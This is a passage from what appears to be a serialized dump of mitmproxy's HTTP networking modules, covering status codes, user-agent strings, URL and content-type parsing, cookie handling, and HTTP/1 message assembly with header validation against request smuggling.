407\nREQUEST_TIMEOUT = 408\nCONFLICT = 409\nGONE = 410\nLENGTH_REQUIRED = 411\nPRECONDITION_FAILED = 412\nPAYLOAD_TOO_LARGE = 413\nREQUEST_URI_TOO_LONG = 414\nUNSUPPORTED_MEDIA_TYPE = 415\nREQUESTED_RANGE_NOT_SATISFIABLE = 416\nEXPECTATION_FAILED = 417\nIM_A_TEAPOT = 418\nNO_RESPONSE = 444\nCLIENT_CLOSED_REQUEST = 499\n\nINTERNAL_SERVER_ERROR = 500\nNOT_IMPLEMENTED = 501\nBAD_GATEWAY = 502\nSERVICE_UNAVAILABLE = 503\nGATEWAY_TIMEOUT = 504\nHTTP_VERSION_NOT_SUPPORTED = 505\nINSUFFICIENT_STORAGE_SPACE = 507\nNOT_EXTENDED = 510\n\nRESPONSES = {\n    # 100\n    CONTINUE: \"Continue\",\n    SWITCHING: \"Switching Protocols\",\n    PROCESSING: \"Processing\",\n    EARLY_HINTS: \"Early Hints\",\n    # 200\n    OK: \"OK\",\n    CREATED: \"Created\",\n    ACCEPTED: \"Accepted\",\n    NON_AUTHORITATIVE_INFORMATION: \"Non-Authoritative Information\",\n    NO_CONTENT: \"No Content\",\n    RESET_CONTENT: \"Reset Content.\",\n    PARTIAL_CONTENT: \"Partial Content\",\n    MULTI_STATUS: \"Multi-Status\",\n    # 300\n    MULTIPLE_CHOICE: \"Multiple Choices\",\n    MOVED_PERMANENTLY: \"Moved Permanently\",\n    FOUND: \"Found\",\n    SEE_OTHER: \"See Other\",\n    NOT_MODIFIED: \"Not Modified\",\n    USE_PROXY: \"Use Proxy\",\n    # 306 not defined??\n    TEMPORARY_REDIRECT: \"Temporary Redirect\",\n    # 400\n    BAD_REQUEST: \"Bad Request\",\n    UNAUTHORIZED: \"Unauthorized\",\n    PAYMENT_REQUIRED: \"Payment Required\",\n    FORBIDDEN: \"Forbidden\",\n    NOT_FOUND: \"Not Found\",\n    NOT_ALLOWED: \"Method Not Allowed\",\n    NOT_ACCEPTABLE: \"Not Acceptable\",\n    PROXY_AUTH_REQUIRED: \"Proxy Authentication Required\",\n    REQUEST_TIMEOUT: \"Request Time-out\",\n    CONFLICT: \"Conflict\",\n    GONE: \"Gone\",\n    LENGTH_REQUIRED: \"Length Required\",\n    PRECONDITION_FAILED: \"Precondition Failed\",\n    PAYLOAD_TOO_LARGE: \"Payload Too Large\",\n    REQUEST_URI_TOO_LONG: \"Request-URI Too Long\",\n    UNSUPPORTED_MEDIA_TYPE: \"Unsupported Media Type\",\n    REQUESTED_RANGE_NOT_SATISFIABLE: \"Requested Range not satisfiable\",\n    EXPECTATION_FAILED: \"Expectation Failed\",\n    IM_A_TEAPOT: \"I'm a teapot\",\n    NO_RESPONSE: \"No Response\",\n    CLIENT_CLOSED_REQUEST: \"Client Closed Request\",\n    # 500\n    INTERNAL_SERVER_ERROR: \"Internal Server Error\",\n    NOT_IMPLEMENTED: \"Not Implemented\",\n    BAD_GATEWAY: \"Bad Gateway\",\n    SERVICE_UNAVAILABLE: \"Service Unavailable\",\n    GATEWAY_TIMEOUT: \"Gateway Time-out\",\n    HTTP_VERSION_NOT_SUPPORTED: \"HTTP Version not supported\",\n    INSUFFICIENT_STORAGE_SPACE: \"Insufficient Storage Space\",\n    NOT_EXTENDED: \"Not Extended\",\n}\n", "mitmproxy/net/http/user_agents.py": "\"\"\"\nA small collection of useful user-agent header strings. These should be\nkept reasonably current to reflect common usage.\n\"\"\"\n# pylint: line-too-long\n# A collection of (name, shortcut, string) tuples.\n\nUASTRINGS = [\n    (\n        \"android\",\n        \"a\",\n        \"Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Nexus 7 Build/JRO03D) AFL/01.04.02\",\n    ),\n    (\n        \"blackberry\",\n        \"l\",\n        \"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+\",\n    ),\n    (\n        \"bingbot\",\n        \"b\",\n        \"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)\",\n    ),\n    (\n        \"chrome\",\n        \"c\",\n        \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1\",\n    ),\n    (\n        \"firefox\",\n        \"f\",\n        \"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:14.0) Gecko/20120405 Firefox/14.0a1\",\n    ),\n    (\"googlebot\", \"g\", \"Googlebot/2.1 (+http://www.googlebot.com/bot.html)\"),\n    (\"ie9\", \"i\", \"Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)\"),\n    (\n        \"ipad\",\n        \"p\",\n        \"Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3\",\n    ),\n    (\n        \"iphone\",\n        \"h\",\n        \"Mozilla/5.0 (iPhone; CPU iPhone OS 4_2_1 like Mac OS X) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5\",  # noqa\n    ),\n    (\n        \"safari\",\n        \"s\",\n        \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10\",\n    ),\n]\n\n\ndef get_by_shortcut(s):\n    \"\"\"\n    Retrieve a user agent entry by shortcut.\n    \"\"\"\n    for i in UASTRINGS:\n        if s == i[1]:\n            return i\n", "mitmproxy/net/http/headers.py": "import collections\nimport re\n\n\ndef parse_content_type(c: str) -> tuple[str, str, dict[str, str]] | None:\n    \"\"\"\n    A simple parser for content-type values. Returns a (type, subtype,\n    parameters) tuple, where type and subtype are strings, and parameters\n    is a dict. If the string could not be parsed, return None.\n\n    E.g. the following string:\n\n        text/html; charset=UTF-8\n\n    Returns:\n\n        (\"text\", \"html\", {\"charset\": \"UTF-8\"})\n    \"\"\"\n    parts = c.split(\";\", 1)\n    ts = parts[0].split(\"/\", 1)\n    if len(ts) != 2:\n        return None\n    d = collections.OrderedDict()\n    if len(parts) == 2:\n        for i in parts[1].split(\";\"):\n            clause = i.split(\"=\", 1)\n            if len(clause) == 2:\n                d[clause[0].strip()] = clause[1].strip()\n    return ts[0].lower(), ts[1].lower(), d\n\n\ndef assemble_content_type(type, subtype, parameters):\n    if not parameters:\n        return f\"{type}/{subtype}\"\n    params = \"; \".join(f\"{k}={v}\" for k, v in parameters.items())\n    return f\"{type}/{subtype}; {params}\"\n\n\ndef infer_content_encoding(content_type: str, content: bytes = b\"\") -> str:\n    \"\"\"\n    Infer the encoding of content from the content-type header.\n    \"\"\"\n    # Use the charset from the header if possible\n    parsed_content_type = parse_content_type(content_type)\n    enc = parsed_content_type[2].get(\"charset\") if parsed_content_type else None\n\n    # Otherwise, infer the encoding\n    if not enc and \"json\" in content_type:\n        enc = \"utf8\"\n\n    if not enc and \"html\" in content_type:\n        meta_charset = re.search(\n            rb\"\"\"<meta[^>]+charset=['\"]?([^'\">]+)\"\"\", content, re.IGNORECASE\n        )\n        if meta_charset:\n            enc = meta_charset.group(1).decode(\"ascii\", \"ignore\")\n\n    if not enc and \"text/css\" in content_type:\n        # @charset rule must be the very first thing.\n        css_charset = re.match(rb\"\"\"@charset \"([^\"]+)\";\"\"\", content, re.IGNORECASE)\n        if css_charset:\n            enc = css_charset.group(1).decode(\"ascii\", \"ignore\")\n\n    # Fallback to latin-1\n    if not enc:\n        enc = \"latin-1\"\n\n    # Use GB 18030 as the superset of GB2312 and GBK to fix common encoding problems on Chinese websites.\n    if enc.lower() in (\"gb2312\", \"gbk\"):\n        enc = \"gb18030\"\n\n    return enc\n", "mitmproxy/net/http/url.py": "from __future__ import annotations\n\nimport re\nimport urllib.parse\nfrom collections.abc import Sequence\nfrom typing import AnyStr\n\nfrom mitmproxy.net import check\nfrom mitmproxy.net.check import is_valid_host\nfrom mitmproxy.net.check import is_valid_port\nfrom mitmproxy.utils.strutils import always_str\n\n# This regex extracts & splits the host header into host and port.\n# Handles the edge case of IPv6 addresses containing colons.\n# https://bugzilla.mozilla.org/show_bug.cgi?id=45891\n\n_authority_re = re.compile(r\"^(?P<host>[^:]+|\\[.+\\])(?::(?P<port>\\d+))?$\")\n\n\ndef parse(url):\n    \"\"\"\n    URL-parsing function that checks that\n        - port is an integer 0-65535\n        - host is a valid IDNA-encoded hostname with no null-bytes\n        - path is valid ASCII\n\n    Args:\n        A URL (as bytes or as unicode)\n\n    Returns:\n        A (scheme, host, port, path) tuple\n\n    Raises:\n        ValueError, if the URL is not properly formatted.\n    \"\"\"\n    # FIXME: We shouldn't rely on urllib here.\n\n    # Size of Ascii character after encoding is 1 byte which is same as its size\n    # But non-Ascii character's size after encoding will be more than its size\n    def ascii_check(x):\n        if len(x) == len(str(x).encode()):\n            return True\n        return False\n\n    if isinstance(url, bytes):\n        url = url.decode()\n        if not ascii_check(url):\n            url = urllib.parse.urlsplit(url)\n            url = list(url)\n            url[3] = urllib.parse.quote(url[3])\n            url = urllib.parse.urlunsplit(url)\n\n    parsed = urllib.parse.urlparse(url)\n    if not parsed.hostname:\n        raise ValueError(\"No hostname given\")\n\n    else:\n        host = parsed.hostname.encode(\"idna\")\n        if isinstance(parsed, urllib.parse.ParseResult):\n            parsed = parsed.encode(\"ascii\")\n\n    port = parsed.port\n    if not port:\n        port = 443 if parsed.scheme == b\"https\" else 80\n\n    full_path = urllib.parse.urlunparse(\n        (b\"\", b\"\", parsed.path, parsed.params, parsed.query, parsed.fragment)\n    )\n    if not full_path.startswith(b\"/\"):\n        full_path = b\"/\" + full_path\n\n    if not check.is_valid_host(host):\n        raise ValueError(\"Invalid Host\")\n\n    return parsed.scheme, host, port, full_path\n\n\ndef unparse(scheme: str, host: str, port: int, path: str = \"\") -> str:\n    \"\"\"\n    Returns a URL string, constructed from the specified components.\n\n    Args:\n        All args must be str.\n    \"\"\"\n    if path == \"*\":\n        path = \"\"\n    authority = hostport(scheme, host, port)\n    return f\"{scheme}://{authority}{path}\"\n\n\ndef encode(s: Sequence[tuple[str, str]], similar_to: str | None = None) -> str:\n    \"\"\"\n    Takes a list of (key, value) tuples and returns a urlencoded string.\n    If similar_to is passed, the output is formatted similar to the provided urlencoded string.\n    \"\"\"\n\n    remove_trailing_equal = False\n    if similar_to:\n        remove_trailing_equal = any(\"=\" not in param for param in similar_to.split(\"&\"))\n\n    encoded = urllib.parse.urlencode(s, False, errors=\"surrogateescape\")\n\n    if encoded and remove_trailing_equal:\n        encoded = encoded.replace(\"=&\", \"&\")\n        if encoded[-1] == \"=\":\n            encoded = encoded[:-1]\n\n    return encoded\n\n\ndef decode(s):\n    \"\"\"\n    Takes a urlencoded string and returns a list of surrogate-escaped (key, value) tuples.\n    \"\"\"\n    return urllib.parse.parse_qsl(s, keep_blank_values=True, errors=\"surrogateescape\")\n\n\ndef quote(b: str, safe: str = \"/\") -> str:\n    \"\"\"\n    Returns:\n        An ascii-encodable str.\n    \"\"\"\n    return urllib.parse.quote(b, safe=safe, errors=\"surrogateescape\")\n\n\ndef unquote(s: str) -> str:\n    \"\"\"\n    Args:\n        s: A surrogate-escaped str\n    Returns:\n        A surrogate-escaped str\n    \"\"\"\n    return urllib.parse.unquote(s, errors=\"surrogateescape\")\n\n\ndef hostport(scheme: AnyStr, host: AnyStr, port: int) -> AnyStr:\n    \"\"\"\n    Returns the host component, with a port specification if needed.\n    \"\"\"\n    if default_port(scheme) == port:\n        return host\n    else:\n        if isinstance(host, bytes):\n            return b\"%s:%d\" % (host, port)\n        else:\n            return \"%s:%d\" % (host, port)\n\n\ndef default_port(scheme: AnyStr) -> int | None:\n    return {\n        \"http\": 80,\n        b\"http\": 80,\n        \"https\": 443,\n        b\"https\": 443,\n    }.get(scheme, None)\n\n\ndef parse_authority(authority: AnyStr, check: bool) -> tuple[str, int | None]:\n    \"\"\"Extract the host and port from host header/authority information\n\n    Raises:\n        ValueError, if check is True and the authority information is malformed.\n    \"\"\"\n    try:\n        if isinstance(authority, bytes):\n            m = _authority_re.match(authority.decode(\"utf-8\"))\n            if not m:\n                raise ValueError\n            host = m[\"host\"].encode(\"utf-8\").decode(\"idna\")\n        else:\n            m = _authority_re.match(authority)\n            if not m:\n                raise ValueError\n            host = m.group(\"host\")\n\n        if host.startswith(\"[\") and host.endswith(\"]\"):\n            host = host[1:-1]\n        if not is_valid_host(host):\n            raise ValueError\n\n        if m.group(\"port\"):\n            port = int(m.group(\"port\"))\n            if not is_valid_port(port):\n                raise ValueError\n            return host, port\n        else:\n            return host, None\n\n    except ValueError:\n        if check:\n            raise\n        else:\n            return always_str(authority, \"utf-8\", \"surrogateescape\"), None\n", "mitmproxy/net/http/__init__.py": "", "mitmproxy/net/http/cookies.py": "import email.utils\nimport re\nimport time\nfrom collections.abc import Iterable\n\nfrom mitmproxy.coretypes import multidict\n\n\"\"\"\nA flexible module for cookie parsing and manipulation.\n\nThis module differs from usual standards-compliant cookie modules in a number\nof ways. We try to be as permissive as possible, and to retain even mal-formed\ninformation. Duplicate cookies are preserved in parsing, and can be set in\nformatting. We do attempt to escape and quote values where needed, but will not\nreject data that violate the specs.\n\nParsing accepts the formats in RFC6265 and partially RFC2109 and RFC2965. We\nalso parse the comma-separated variant of Set-Cookie that allows multiple\ncookies to be set in a single header. Serialization follows RFC6265.\n\n    http://tools.ietf.org/html/rfc6265\n    http://tools.ietf.org/html/rfc2109\n    http://tools.ietf.org/html/rfc2965\n\"\"\"\n\n_cookie_params = {\n    \"expires\",\n    \"path\",\n    \"comment\",\n    \"max-age\",\n    \"secure\",\n    \"httponly\",\n    \"version\",\n}\n\nESCAPE = re.compile(r\"([\\\"\\\\])\")\n\n\nclass CookieAttrs(multidict.MultiDict):\n    @staticmethod\n    def _kconv(key):\n        return key.lower()\n\n    @staticmethod\n    def _reduce_values(values):\n        # See the StickyCookieTest for a weird cookie that only makes sense\n        # if we take the last part.\n        return values[-1]\n\n\nTSetCookie = tuple[str, str | None, CookieAttrs]\nTPairs = list[tuple[str, str | None]]\n\n\ndef _read_until(s, start, term):\n    \"\"\"\n    Read until one of the characters in term is reached.\n    \"\"\"\n    if start == len(s):\n        return \"\", start + 1\n    for i in range(start, len(s)):\n        if s[i] in term:\n            return s[start:i], i\n    return s[start : i + 1], i + 1\n\n\ndef _read_quoted_string(s, start):\n    \"\"\"\n    start: offset to the first quote of the string to be read\n\n    A sort of loose super-set of the various quoted string specifications.\n\n    RFC6265 disallows backslashes or double quotes within quoted strings.\n    Prior RFCs use backslashes to escape. This leaves us free to apply\n    backslash escaping by default and be compatible with everything.\n    \"\"\"\n    escaping = False\n    ret = []\n    # Skip the first quote\n    i = start  # initialize in case the loop doesn't run.\n    for i in range(start + 1, len(s)):\n        if escaping:\n            ret.append(s[i])\n            escaping = False\n        elif s[i] == '\"':\n            break\n        elif s[i] == \"\\\\\":\n            escaping = True\n        else:\n            ret.append(s[i])\n    return \"\".join(ret), i + 1\n\n\ndef _read_key(s, start, delims=\";=\"):\n    \"\"\"\n    Read a key - the LHS of a token/value pair in a cookie.\n    \"\"\"\n    return _read_until(s, start, delims)\n\n\ndef _read_value(s, start, delims):\n    \"\"\"\n    Reads a value - the RHS of a token/value pair in a cookie.\n    \"\"\"\n    if start >= len(s):\n        return \"\", start\n    elif s[start] == '\"':\n        return _read_quoted_string(s, start)\n    else:\n        return _read_until(s, start, delims)\n\n\ndef _read_cookie_pairs(s, off=0):\n    \"\"\"\n    Read pairs of lhs=rhs values from Cookie headers.\n\n    off: start offset\n    \"\"\"\n    pairs = []\n\n    while True:\n        lhs, off = _read_key(s, off)\n        lhs = lhs.lstrip()\n\n        rhs = \"\"\n        if off < len(s) and s[off] == \"=\":\n            rhs, off = _read_value(s, off + 1, \";\")\n        if rhs or lhs:\n            pairs.append([lhs, rhs])\n\n        off += 1\n\n        if not off < len(s):\n            break\n\n    return pairs, off\n\n\ndef _read_set_cookie_pairs(s: str, off=0) -> tuple[list[TPairs], int]:\n    \"\"\"\n    Read pairs of lhs=rhs values from SetCookie headers while handling multiple cookies.\n\n    off: start offset\n    specials: attributes that are treated specially\n    \"\"\"\n    cookies: list[TPairs] = []\n    pairs: TPairs = []\n\n    while True:\n        lhs, off = _read_key(s, off, \";=,\")\n        lhs = lhs.lstrip()\n\n        rhs = \"\"\n        if off < len(s) and s[off] == \"=\":\n            rhs, off = _read_value(s, off + 1, \";,\")\n\n            # Special handling of attributes\n            if lhs.lower() == \"expires\":\n                # 'expires' values can contain commas in them so they need to\n                # be handled separately.\n\n                # We actually bank on the fact that the expires value WILL\n                # contain a comma. Things will fail, if they don't.\n\n                # '3' is just a heuristic we use to determine whether we've\n                # only read a part of the expires value and we should read more.\n                if len(rhs) <= 3:\n                    trail, off = _read_value(s, off + 1, \";,\")\n                    rhs = rhs + \",\" + trail\n\n            # as long as there's a \"=\", we consider it a pair\n            pairs.append((lhs, rhs))\n\n        elif lhs:\n            pairs.append((lhs, None))\n\n        # comma marks the beginning of a new cookie\n        if off < len(s) and s[off] == \",\":\n            cookies.append(pairs)\n            pairs = []\n\n        off += 1\n\n        if not off < len(s):\n            break\n\n    if pairs or not cookies:\n        cookies.append(pairs)\n\n    return cookies, off\n\n\ndef _has_special(s: str) -> bool:\n    for i in s:\n        if i in '\",;\\\\':\n            return True\n        o = ord(i)\n        if o < 0x21 or o > 0x7E:\n            return True\n    return False\n\n\ndef _format_pairs(pairs, specials=(), sep=\"; \"):\n    \"\"\"\n    specials: A lower-cased list of keys that will not be quoted.\n    \"\"\"\n    vals = []\n    for k, v in pairs:\n        if v is None:\n            val = k\n        elif k.lower() not in specials and _has_special(v):\n            v = ESCAPE.sub(r\"\\\\\\1\", v)\n            v = '\"%s\"' % v\n            val = f\"{k}={v}\"\n        else:\n            val = f\"{k}={v}\"\n        vals.append(val)\n    return sep.join(vals)\n\n\ndef _format_set_cookie_pairs(lst):\n    return _format_pairs(lst, specials=(\"expires\", \"path\"))\n\n\ndef parse_cookie_header(line):\n    \"\"\"\n    Parse a Cookie header value.\n    Returns a list of (lhs, rhs) tuples.\n    \"\"\"\n    pairs, off_ = _read_cookie_pairs(line)\n    return pairs\n\n\ndef parse_cookie_headers(cookie_headers):\n    cookie_list = []\n    for header in cookie_headers:\n        cookie_list.extend(parse_cookie_header(header))\n    return cookie_list\n\n\ndef format_cookie_header(lst):\n    \"\"\"\n    Formats a Cookie header value.\n    \"\"\"\n    return _format_pairs(lst)\n\n\ndef parse_set_cookie_header(line: str) -> list[TSetCookie]:\n    \"\"\"\n    Parse a Set-Cookie header value\n\n    Returns:\n        A list of (name, value, attrs) tuples, where attrs is a\n        CookieAttrs dict of attributes. No attempt is made to parse attribute\n        values - they are treated purely as strings.\n    \"\"\"\n    cookie_pairs, off = _read_set_cookie_pairs(line)\n    cookies = []\n    for pairs in cookie_pairs:\n        if pairs:\n            cookie, *attrs = pairs\n            cookies.append((cookie[0], cookie[1], CookieAttrs(attrs)))\n    return cookies\n\n\ndef parse_set_cookie_headers(headers: Iterable[str]) -> list[TSetCookie]:\n    rv = []\n    for header in headers:\n        cookies = parse_set_cookie_header(header)\n        rv.extend(cookies)\n    return rv\n\n\ndef format_set_cookie_header(set_cookies: list[TSetCookie]) -> str:\n    \"\"\"\n    Formats a Set-Cookie header value.\n    \"\"\"\n\n    rv = []\n\n    for name, value, attrs in set_cookies:\n        pairs = [(name, value)]\n        pairs.extend(attrs.fields if hasattr(attrs, \"fields\") else attrs)\n\n        rv.append(_format_set_cookie_pairs(pairs))\n\n    return \", \".join(rv)\n\n\ndef refresh_set_cookie_header(c: str, delta: int) -> str:\n    \"\"\"\n    Args:\n        c: A Set-Cookie string\n        delta: Time delta in seconds\n    Returns:\n        A refreshed Set-Cookie string\n    Raises:\n        ValueError, if the cookie is invalid.\n    \"\"\"\n    cookies = parse_set_cookie_header(c)\n    for cookie in cookies:\n        name, value, attrs = cookie\n        if not name or not value:\n            raise ValueError(\"Invalid Cookie\")\n\n        if \"expires\" in attrs:\n            e = email.utils.parsedate_tz(attrs[\"expires\"])\n            if e:\n                f = email.utils.mktime_tz(e) + delta\n                attrs.set_all(\"expires\", [email.utils.formatdate(f, usegmt=True)])\n            else:\n                # This can happen when the expires tag is invalid.\n                # reddit.com sends a an expires tag like this: \"Thu, 31 Dec\n                # 2037 23:59:59 GMT\", which is valid RFC 1123, but not\n                # strictly correct according to the cookie spec. Browsers\n                # appear to parse this tolerantly - maybe we should too.\n                # For now, we just ignore this.\n                del attrs[\"expires\"]\n    return format_set_cookie_header(cookies)\n\n\ndef get_expiration_ts(cookie_attrs):\n    \"\"\"\n    Determines the time when the cookie will be expired.\n\n    Considering both 'expires' and 'max-age' parameters.\n\n    Returns: timestamp of when the cookie will expire.\n             None, if no expiration time is set.\n    \"\"\"\n    if \"expires\" in cookie_attrs:\n        e = email.utils.parsedate_tz(cookie_attrs[\"expires\"])\n        if e:\n            return email.utils.mktime_tz(e)\n\n    elif \"max-age\" in cookie_attrs:\n        try:\n            max_age = int(cookie_attrs[\"Max-Age\"])\n        except ValueError:\n            pass\n        else:\n            now_ts = time.time()\n            return now_ts + max_age\n\n    return None\n\n\ndef is_expired(cookie_attrs):\n    \"\"\"\n    Determines whether a cookie has expired.\n\n    Returns: boolean\n    \"\"\"\n\n    exp_ts = get_expiration_ts(cookie_attrs)\n    now_ts = time.time()\n\n    # If no expiration information was provided with the cookie\n    if exp_ts is None:\n        return False\n    else:\n        return exp_ts <= now_ts\n\n\ndef group_cookies(pairs):\n    \"\"\"\n    Converts a list of pairs to a (name, value, attrs) for each cookie.\n    \"\"\"\n\n    if not pairs:\n        return []\n\n    cookie_list = []\n\n    # First pair is always a new cookie\n    name, value = pairs[0]\n    attrs = []\n\n    for k, v in pairs[1:]:\n        if k.lower() in _cookie_params:\n            attrs.append((k, v))\n        else:\n            cookie_list.append((name, value, CookieAttrs(attrs)))\n            name, value, attrs = k, v, []\n\n    cookie_list.append((name, value, CookieAttrs(attrs)))\n    return cookie_list\n", "mitmproxy/net/http/http1/assemble.py": "def assemble_request(request):\n    if request.data.content is None:\n        raise ValueError(\"Cannot assemble flow with missing content\")\n    head = assemble_request_head(request)\n    body = b\"\".join(\n        assemble_body(\n            request.data.headers, [request.data.content], request.data.trailers\n        )\n    )\n    return head + body\n\n\ndef assemble_request_head(request):\n    first_line = _assemble_request_line(request.data)\n    headers = _assemble_request_headers(request.data)\n    return b\"%s\\r\\n%s\\r\\n\" % (first_line, headers)\n\n\ndef assemble_response(response):\n    if response.data.content is None:\n        raise ValueError(\"Cannot assemble flow with missing content\")\n    head = assemble_response_head(response)\n    body = b\"\".join(\n        assemble_body(\n            response.data.headers, [response.data.content], response.data.trailers\n        )\n    )\n    return head + body\n\n\ndef assemble_response_head(response):\n    first_line = _assemble_response_line(response.data)\n    headers = _assemble_response_headers(response.data)\n    return b\"%s\\r\\n%s\\r\\n\" % (first_line, headers)\n\n\ndef assemble_body(headers, body_chunks, trailers):\n    if \"chunked\" in headers.get(\"transfer-encoding\", \"\").lower():\n        for chunk in body_chunks:\n            if chunk:\n                yield b\"%x\\r\\n%s\\r\\n\" % (len(chunk), chunk)\n        if trailers:\n            yield b\"0\\r\\n%s\\r\\n\" % trailers\n        else:\n            yield b\"0\\r\\n\\r\\n\"\n    else:\n        if trailers:\n            raise ValueError(\n                \"Sending HTTP/1.1 trailer headers requires transfer-encoding: chunked\"\n            )\n        for chunk in body_chunks:\n            yield chunk\n\n\ndef _assemble_request_line(request_data):\n    \"\"\"\n    Args:\n        request_data (mitmproxy.net.http.request.RequestData)\n    \"\"\"\n    if request_data.method.upper() == b\"CONNECT\":\n        return b\"%s %s %s\" % (\n            request_data.method,\n            request_data.authority,\n            request_data.http_version,\n        )\n    elif request_data.authority:\n        return b\"%s %s://%s%s %s\" % (\n            request_data.method,\n            request_data.scheme,\n            request_data.authority,\n            request_data.path,\n            request_data.http_version,\n        )\n    else:\n        return b\"%s %s %s\" % (\n            request_data.method,\n            request_data.path,\n            request_data.http_version,\n        )\n\n\ndef _assemble_request_headers(request_data):\n    \"\"\"\n    Args:\n        request_data (mitmproxy.net.http.request.RequestData)\n    \"\"\"\n    return bytes(request_data.headers)\n\n\ndef _assemble_response_line(response_data):\n    return b\"%s %d %s\" % (\n        response_data.http_version,\n        response_data.status_code,\n        response_data.reason,\n    )\n\n\ndef _assemble_response_headers(response):\n    return bytes(response.headers)\n", "mitmproxy/net/http/http1/__init__.py": "from .assemble import assemble_body\nfrom .assemble import assemble_request\nfrom .assemble import assemble_request_head\nfrom .assemble import assemble_response\nfrom .assemble import assemble_response_head\nfrom .read import connection_close\nfrom .read import expected_http_body_size\nfrom .read import read_request_head\nfrom .read import read_response_head\nfrom .read import validate_headers\n\n__all__ = [\n    \"read_request_head\",\n    \"read_response_head\",\n    \"connection_close\",\n    \"expected_http_body_size\",\n    \"validate_headers\",\n    \"assemble_request\",\n    \"assemble_request_head\",\n    \"assemble_response\",\n    \"assemble_response_head\",\n    \"assemble_body\",\n]\n", "mitmproxy/net/http/http1/read.py": "import re\nimport time\nfrom collections.abc import Iterable\n\nfrom mitmproxy.http import Headers\nfrom mitmproxy.http import Request\nfrom mitmproxy.http import Response\nfrom mitmproxy.net.http import url\n\n\ndef get_header_tokens(headers, key):\n    \"\"\"\n    Retrieve all tokens for a header key. A number of different headers\n    follow a pattern where each header line can containe comma-separated\n    tokens, and headers can be set multiple times.\n    \"\"\"\n    if key not in headers:\n        return []\n    tokens = headers[key].split(\",\")\n    return [token.strip() for token in tokens]\n\n\ndef connection_close(http_version, headers):\n    \"\"\"\n    Checks the message to see if the client connection should be closed\n    according to RFC 2616 Section 8.1.\n    If we don't have a Connection header, HTTP 1.1 connections are assumed\n    to be persistent.\n    \"\"\"\n    if \"connection\" in headers:\n        tokens = get_header_tokens(headers, \"connection\")\n        if \"close\" in tokens:\n            return True\n        elif \"keep-alive\" in tokens:\n            return False\n\n    return http_version not in (\n        \"HTTP/1.1\",\n        b\"HTTP/1.1\",\n        \"HTTP/2.0\",\n        b\"HTTP/2.0\",\n    )\n\n\n# https://datatracker.ietf.org/doc/html/rfc7230#section-3.2: Header fields are tokens.\n# \"!\" / \"#\" / \"$\" / \"%\" / \"&\" / \"'\" / \"*\" / \"+\" / \"-\" / \".\" /  \"^\" / \"_\" / \"`\" / \"|\" / \"~\" / DIGIT / ALPHA\n_valid_header_name = re.compile(rb\"^[!#$%&'*+\\-.^_`|~0-9a-zA-Z]+$\")\n\n\ndef validate_headers(headers: Headers) -> None:\n    \"\"\"\n    Validate headers to avoid request smuggling attacks. Raises a ValueError if they are malformed.\n    \"\"\"\n\n    te_found = False\n    cl_found = False\n\n    for name, value in headers.fields:\n        if not _valid_header_name.match(name):\n            raise ValueError(\n                f\"Received an invalid header name: {name!r}. Invalid header names may introduce \"\n                f\"request smuggling vulnerabilities. Disable the validate_inbound_headers option \"\n                f\"to skip this security check.\"\n            )\n\n        name_lower = name.lower()\n        te_found = te_found or name_lower == b\"transfer-encoding\"\n        cl_found = cl_found or name_lower == b\"content-length\"\n\n    if te_found and cl_found:\n        raise ValueError(\n            \"Received both a Transfer-Encoding and a Content-Length header, \"\n            \"refusing as recommended in RFC 7230 Section 3.3.3. \"\n            \"See https://github.com/mitmproxy/mitmproxy/issues/4799 for details. \"\n            \"Disable the validate_inbound_headers option to skip this security check.\"\n        )\n\n\ndef expected_http_body_size(\n    request: Request, response: Response | None = None\n) -> int | None:\n    \"\"\"\n    Returns:\n        The expected body length:\n        - a positive integer, if the size is known in advance\n        - None, if the size in unknown in advance (chunked encoding)\n        - -1, if all data should be read until end of stream.\n\n    Raises:\n        ValueError, if the content length header is invalid\n    \"\"\"\n    # Determine response size according to http://tools.ietf.org/html/rfc7230#section-3.3, which is inlined below.\n    if not response:\n        headers = request.headers\n    else:\n        headers = response.headers\n\n        #    1.  Any response to a HEAD request and any response with a 1xx\n        #        (Informational), 204 (No Content), or 304 (Not Modified) status\n        #        code is always terminated by the first empty line after the\n        #        header fields, regardless of the header fields present in the\n        #        message, and thus cannot contain a message body.\n        if request.method.upper() == \"HEAD\":\n            return 0\n        if 100 <= response.status_code <= 199:\n            return 0\n        if response.status_code in (204, 304):\n            return 0\n\n        #    2.  Any 2xx (Successful) response to a CONNECT request implies that\n        #        the connection will become a tunnel immediately after the empty\n        #        line that concludes the header fields.  A client MUST ignore any\n        #        Content-Length or Transfer-Encoding header fields received in\n        #        such a message.\n        if 200 <= response.status_code <= 299 and request.method.upper() == \"CONNECT\":\n            return 0\n\n    #    3.  If a Transfer-Encoding header field is present and the chunked\n    #        transfer coding (Section 4.1) is the final encoding, the message\n    #        body length is determined by reading and decoding the chunked\n    #        data until the transfer coding indicates the data is complete.\n    #\n    #        If a Transfer-Encoding header field is present in a response and\n    #        the chunked transfer coding is not the final encoding, the\n    #        message body length is determined by reading the connection until\n    #        it is closed by the server.  If a Transfer-Encoding header field\n    #        is present in a request and the chunked transfer coding is not\n    #        the final encoding, the message body length cannot be determined\n    #        reliably; the server MUST respond with the 400 (Bad Request)\n    #        status code and then close the connection.\n    #\n    #        If a message is received with both a Transfer-Encoding and a\n    #        Content-Length header field, the Transfer-Encoding overrides the\n    #        Content-Length.  Such a message might indicate an attempt to\n    #        perform request smuggling (Section 9.5) or response splitting\n    #        (Section 9.4) and ought to be handled as an error.  A sender MUST\n    #        remove the received Content-Length field prior to forwarding such\n    #        a message downstream.\n    #\n    if \"transfer-encoding\" in headers:\n        # we should make sure that there isn't also a content-length header.\n        # this is already handled in validate_headers.\n\n        te: str = 